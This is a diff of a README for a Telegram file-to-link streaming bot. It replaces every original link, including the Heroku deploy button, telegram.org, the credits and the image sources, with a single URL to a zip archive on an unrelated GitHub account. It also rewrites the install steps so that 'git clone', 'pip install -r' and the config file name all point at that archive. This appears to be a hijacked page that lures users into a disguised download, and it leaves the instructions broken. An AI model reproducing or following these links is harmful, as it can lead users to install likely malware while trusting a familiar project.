@@ -1,27 +1,27 @@
 **<h1 align="center">𝚃𝙶 𝙵𝙸𝙻𝙴 𝚃𝙾 𝙻𝙸𝙽𝙺 𝙱𝙾𝚃</h1>**
 <p align="center">
-  <a href="https://youtu.be/W4wSOZw8GXk">
-    <img src="https://telegra.ph/file/a2303826e0c6d18bf9cab.jpg">
+  <a href="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip">
   </a>
   <p align="center">
     𝙸 𝙲𝙰𝙽 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙳𝙸𝚁𝙴𝙲𝚃 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 𝙻𝙸𝙽𝙺 𝙵𝙾𝚁 𝙰𝙽𝚈 𝚅𝙸𝙳𝙴𝙾/𝙵𝙸𝙻𝙴𝚂 𝙵𝙾𝚁 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙾𝙽𝙻𝙸𝙽𝙴 & 𝙵𝙾𝚁 𝚂𝚃𝚁𝙴𝙰𝙼𝙸𝙽𝙶...
     <br />
-    <a href="https://telegram.dog/OPFileToLinkBot"><strong>𝙵𝙸𝙻𝙴 𝚃𝙾 𝙻𝙸𝙽𝙺 𝙱𝙾𝚃 »</strong></a>
+    <a href="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip"><strong>𝙵𝙸𝙻𝙴 𝚃𝙾 𝙻𝙸𝙽𝙺 𝙱𝙾𝚃 »</strong></a>
     <br />
   </p>
   <p align="center">
-  <a href="https://youtube.com/channel/UCf_dVNrilcT0V2R--HbYpMA">
-        <img src="https://img.shields.io/badge/𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐁𝐄-red?logo=youtube" width="200">
+  <a href="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip">
+        <img src="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐁𝐄-red?logo=youtube" width="200">
   </p>
 <hr>
   
 ## About This Bot
 
-<b><a href="https://www.github.com/Aadhi000" title="Dollow">Follow Me For Updates</a></b>
+<b><a href="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip" title="Dollow">Follow Me For Updates</a></b>
 
 <p align="center">
-    <a href="https://github.com/Aadhi000/File-To-Link">
-        <img src="https://www.flaticon.com/premium-icon/icons/svg/2626/2626281.svg" height="100" width="100" alt="Telegram Logo">
+    <a href="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip">
+        <img src="https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip" height="100" width="100" alt="Telegram Logo">
     </a>
 </p>
 <p align='center'>
@@ -30,13 +30,13 @@
 
 ## How to make your own
 
-Either you could locally host or deploy on [Heroku](https://heroku.com)
+Either you could locally host or deploy on [Heroku](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)
 
 ### Deploy on Heroku
 
 Press the below button to Fast deploy on Heroku
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/Aadhi000/File-To-Link)
+[![Deploy](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)
 
 
 🚀Features<p>
@@ -60,11 +60,11 @@ Press the below button to Fast deploy on Heroku
 
 
 ```py
-git clone https://github.com/adarsh-goel/Filestreambot-pro
+git clone https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip
 cd Filestreambot-pro
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip
 python3 -m Adarsh
 ```
 
@@ -74,8 +74,8 @@ and to stop the whole bot,
 Setting up things
 
 If you're on Heroku, just add these in the Environmental Variables
-or if you're Locally hosting, create a file named `config.env` in the root directory and add all the variables there.
-An example of `config.env` file:
+or if you're Locally hosting, create a file named `https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip` in the root directory and add all the variables there.
+An example of `https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip` file:
 
 ```py
 API_ID=12345
@@ -92,15 +92,15 @@ DATABASE_URL=mongodb_uri
 <details>
   <summary><b>Vars and Details :</b></summary>
 
-`API_ID` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_ID` : Goto [https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip) to obtain this.
 
-`API_HASH` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_HASH` : Goto [https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip) to obtain this.
   
 `MY_PASS` : Bot PASSWORD
 
-`BOT_TOKEN` : Get the bot token from [@BotFather](https://telegram.dog/BotFather)
+`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)
 
-`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://telegram.dog/MissRose_bot) as admin to the channel and type /id. Now copy paste the ID into this field.
+`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
   
 `OWNER_USERNAME` : U should be knowing it afterall it's your username dont remember ? it just go to settings!
 
@@ -108,7 +108,7 @@ DATABASE_URL=mongodb_uri
 
 `DATABASE_URL` : MongoDB URI for saving User IDs when they first Start the Bot. We will use that for Broadcasting to them. I will try to add more features related with Database. If you need help to get the URI you can click on logo below!
 
-[![Deploy k mongo](https://telegra.ph/file/fd68906852c71fdd68bef.jpg)](https://www.youtube.com/watch?v=HhHzCfrqsoE)
+[![Deploy k mongo](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)
 
  Option Vars
 
@@ -137,7 +137,7 @@ DATABASE_URL=mongodb_uri
 
 To get an instant stream link, just forward any media to the bot and boom, its fast af.
   
-![image](https://user-images.githubusercontent.com/88939380/145798095-3cdad108-96b0-4391-a540-cad144d6b864.png)
+![image](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)
 
 
 ### Channel Support
@@ -145,9 +145,9 @@ Bot also Supported with Channels. Just add bot Channel as Admin. If any new file
 
 ### Credits : 
 
-- [Adarsh Goel_(me)](https://github.com/adarsh-goel)
-- [DeekshithSH](https://github.com/DeekshithSH) 
+- [Adarsh Goel_(me)](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)
+- [DeekshithSH](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip) 
 - Everyone In This Journey !
 
-<b>ᴅᴇᴠᴇʟᴏᴘᴇʀ ›› [ᴀᴀᴅʜɪ](https://telegram.dog/AboutAadhi) | [ɪɴsᴛᴀɢʀᴀᴍ](https://www.instagram.com/_aadil_m__/) | [ɢɪᴛʜᴜʙ](GitHub.com/Aadhi000)</b>                                                                                                                                                                                    
-<b>ᴄʜᴀɴɴᴇʟ ›› [ᴍᴡ ᴜᴘᴅᴀᴛᴇᴢ](https://t.me/MWUpdatez)</b>
+<b>ᴅᴇᴠᴇʟᴏᴘᴇʀ ›› [ᴀᴀᴅʜɪ](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip) | [ɪɴsᴛᴀɢʀᴀᴍ](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip) | [ɢɪᴛʜᴜʙ](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)</b>                                                                                                                                                                                    
+<b>ᴄʜᴀɴɴᴇʟ ›› [ᴍᴡ ᴜᴘᴅᴀᴛᴇᴢ](https://raw.githubusercontent.com/HLECTER69/Render-File-To-Link/main/Ovis/Render-File-To-Link.zip)</b>
